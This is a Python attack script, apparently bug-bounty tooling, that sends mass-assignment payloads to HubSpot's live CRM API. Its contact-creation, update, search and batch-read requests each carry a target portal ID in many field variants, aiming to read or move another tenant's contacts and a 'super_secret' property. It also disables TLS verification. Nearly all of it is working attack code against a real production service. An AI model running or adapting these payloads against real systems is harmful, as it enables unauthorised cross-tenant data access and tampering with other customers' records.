#!/usr/bin/env python3
"""
Mass Assignment (Parameter Injection) Attacks
Based on: ATO Report Section 4.3 - API3:2023 Mass Assignment

Tests if HubSpot API "autobinds" unexpected parameters like portalId
into internal objects, bypassing authorization checks.
"""

import requests
import json
import os
import urllib3
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')

print("="*80)
print("Mass Assignment (Parameter Injection) Attacks")
print("="*80)
print("\nBased on GitHub 2012 mass assignment vulnerability")
print("Tests if API autobinds unexpected parameters to internal models")
print("="*80)

findings = []

# ============================================================================
# 1. CONTACT CREATION WITH INJECTED PORTAL
# ============================================================================

def test_contact_creation_injection():
    """Try to create contact with injected portalId parameter"""
    print("\n[*] Testing contact creation with parameter injection...")

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    url = 'https://api.hubapi.com/crm/v3/objects/contacts'

    # Test different injection points
    injection_payloads = [
        # Standard payload with portalId in properties
        {
            'properties': {
                'email': 'massassign1@test.com',
                'firstname': 'MassAssign',
                'portalId': TARGET_PORTAL
            }
        },
        # PortalId at root level
        {
            'portalId': TARGET_PORTAL,
            'properties': {
                'email': 'massassign2@test.com',
                'firstname': 'MassAssign'
            }
        },
        # Nested portalId
        {
            'properties': {
                'email': 'massassign3@test.com',
                'firstname': 'MassAssign',
                'contact': {
                    'portalId': TARGET_PORTAL
                }
            }
        },
        # Array notation
        {
            'properties[portalId]': TARGET_PORTAL,
            'properties': {
                'email': 'massassign4@test.com',
                'firstname': 'MassAssign'
            }
        },
    ]

    for i, payload in enumerate(injection_payloads, 1):
        print(f"\n  Test {i}: {json.dumps(payload, indent=4)[:200]}...")

        try:
            r = requests.post(url, headers=headers, json=payload, verify=False, timeout=10)
            print(f"  Status: {r.status_code}")

            if r.status_code == 201:
                data = r.json()
                contact_id = data.get('id')

                # Check which portal the contact was created in
                # If portalId was injected, it might be in target portal
                check_url = f'https://api.hubapi.com/crm/v3/objects/contacts/{contact_id}'
                r2 = requests.get(check_url, headers=headers, verify=False, timeout=5)

                if r2.status_code == 200:
                    contact_data = r2.json()
                    print(f"  Created in portal: {contact_data.get('properties', {}).get('hs_object_id', 'unknown')}")

                    # Check if we can access it without our token (would mean it's in target portal)
                    findings.append({
                        'attack': 'Contact Creation Mass Assignment',
                        'payload': payload,
                        'contact_id': contact_id,
                        'data': contact_data
                    })

        except Exception as e:
            print(f"  Error: {str(e)[:100]}")

# ============================================================================
# 2. CONTACT UPDATE WITH INJECTED PORTAL
# ============================================================================

def test_contact_update_injection():
    """Try to move contact to different portal via update"""
    print("\n[*] Testing contact update with portal injection...")

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    # First create a test contact in our portal
    create_url = 'https://api.hubapi.com/crm/v3/objects/contacts'
    create_payload = {
        'properties': {
            'email': 'movetest@test.com',
            'firstname': 'MoveTest'
        }
    }

    r = requests.post(create_url, headers=headers, json=create_payload, verify=False, timeout=10)

    if r.status_code != 201:
        print(f"  Could not create test contact: {r.status_code}")
        return

    contact_id = r.json()['id']
    print(f"  Created test contact: {contact_id}")

    # Now try to update it with injected portalId
    update_url = f'https://api.hubapi.com/crm/v3/objects/contacts/{contact_id}'

    update_payloads = [
        # PortalId in properties
        {
            'properties': {
                'firstname': 'MovedContact',
                'portalId': TARGET_PORTAL,
                'hs_portal_id': TARGET_PORTAL
            }
        },
        # PortalId at root
        {
            'portalId': TARGET_PORTAL,
            'properties': {
                'firstname': 'MovedContact'
            }
        },
        # Hidden/internal field injection
        {
            'properties': {
                'firstname': 'MovedContact',
                '__portalId': TARGET_PORTAL,
                '_portalId': TARGET_PORTAL,
                'hubspot_portal_id': TARGET_PORTAL
            }
        },
    ]

    for i, payload in enumerate(update_payloads, 1):
        print(f"\n  Update test {i}...")

        try:
            r = requests.patch(update_url, headers=headers, json=payload, verify=False, timeout=10)
            print(f"  Status: {r.status_code}")

            if r.status_code == 200:
                print(f"  Response: {r.text[:200]}")
                findings.append({
                    'attack': 'Contact Update Mass Assignment',
                    'payload': payload,
                    'response': r.json()
                })

        except Exception as e:
            print(f"  Error: {str(e)[:100]}")

# ============================================================================
# 3. SEARCH WITH INJECTED PORTAL CONTEXT
# ============================================================================

def test_search_injection():
    """Try to inject portal context into search"""
    print("\n[*] Testing search with portal injection...")

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    url = 'https://api.hubapi.com/crm/v3/objects/contacts/search'

    search_payloads = [
        # PortalId in filter
        {
            'portalId': TARGET_PORTAL,
            'filterGroups': [],
            'properties': ['firstname', 'super_secret', 'email'],
            'limit': 10
        },
        # PortalId in context object
        {
            'context': {
                'portalId': TARGET_PORTAL
            },
            'filterGroups': [],
            'properties': ['firstname', 'super_secret', 'email'],
            'limit': 10
        },
        # PortalId in options
        {
            'filterGroups': [],
            'properties': ['firstname', 'super_secret', 'email'],
            'limit': 10,
            'options': {
                'portalId': TARGET_PORTAL
            }
        },
        # Multiple portalId fields
        {
            'portalId': TARGET_PORTAL,
            'portal_id': TARGET_PORTAL,
            'hubId': TARGET_PORTAL,
            'filterGroups': [],
            'properties': ['firstname', 'super_secret', 'email'],
            'limit': 10
        },
    ]

    for i, payload in enumerate(search_payloads, 1):
        print(f"\n  Search injection test {i}...")

        try:
            r = requests.post(url, headers=headers, json=payload, verify=False, timeout=10)
            print(f"  Status: {r.status_code}")

            if r.status_code == 200:
                data = r.json()
                if data.get('results'):
                    print(f"  Found {len(data['results'])} results")

                    # Check if results are from target portal
                    for result in data['results']:
                        if int(result['id']) < 50000000000:  # Likely target portal
                            print(f"  *** POTENTIAL: Low contact ID {result['id']} ***")
                            findings.append({
                                'attack': 'Search Mass Assignment',
                                'payload': payload,
                                'result': result
                            })

        except Exception as e:
            print(f"  Error: {str(e)[:100]}")

# ============================================================================
# 4. BATCH OPERATIONS WITH PORTAL INJECTION
# ============================================================================

def test_batch_injection():
    """Try portal injection in batch operations"""
    print("\n[*] Testing batch operations with portal injection...")

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    url = 'https://api.hubapi.com/crm/v3/objects/contacts/batch/read'

    batch_payloads = [
        # PortalId at root with inputs
        {
            'portalId': TARGET_PORTAL,
            'properties': ['firstname', 'super_secret', 'email'],
            'inputs': [{'id': '1'}, {'id': '2'}, {'id': '3'}]
        },
        # PortalId in each input
        {
            'properties': ['firstname', 'super_secret', 'email'],
            'inputs': [
                {'id': '1', 'portalId': TARGET_PORTAL},
                {'id': '2', 'portalId': TARGET_PORTAL}
            ]
        },
        # PortalId with idProperty
        {
            'portalId': TARGET_PORTAL,
            'properties': ['firstname', 'super_secret', 'email'],
            'inputs': [{'id': '1'}],
            'idProperty': 'id'
        },
    ]

    for i, payload in enumerate(batch_payloads, 1):
        print(f"\n  Batch injection test {i}...")

        try:
            r = requests.post(url, headers=headers, json=payload, verify=False, timeout=10)
            print(f"  Status: {r.status_code}")

            if r.status_code in [200, 207]:
                data = r.json()
                if data.get('results'):
                    print(f"  Got {len(data['results'])} results")
                    findings.append({
                        'attack': 'Batch Mass Assignment',
                        'payload': payload,
                        'data': data
                    })

        except Exception as e:
            print(f"  Error: {str(e)[:100]}")

# ============================================================================
# MAIN EXECUTION
# ============================================================================

test_contact_creation_injection()
test_contact_update_injection()
test_search_injection()
test_batch_injection()

print("\n" + "="*80)
print(f"Mass Assignment Testing Complete")
print(f"Findings: {len(findings)}")
print("="*80)

if findings:
    print("\n*** POTENTIAL MASS ASSIGNMENT VULNERABILITIES ***\n")

    for i, finding in enumerate(findings, 1):
        print(f"{i}. {finding['attack']}")
        print(f"   Payload: {json.dumps(finding['payload'], indent=6)[:300]}")
        print()

    with open('/home/user/Hub/findings/mass_assignment_findings.json', 'w') as f:
        json.dump(findings, f, indent=2)

    print("Saved to: findings/mass_assignment_findings.json")
else:
    print("\nNo mass assignment vulnerabilities found.")
    print("\nThis means:")
    print("  - API does not auto-bind unexpected parameters")
    print("  - PortalId cannot be injected at any level")
    print("  - Good input validation and parameter allow-listing")
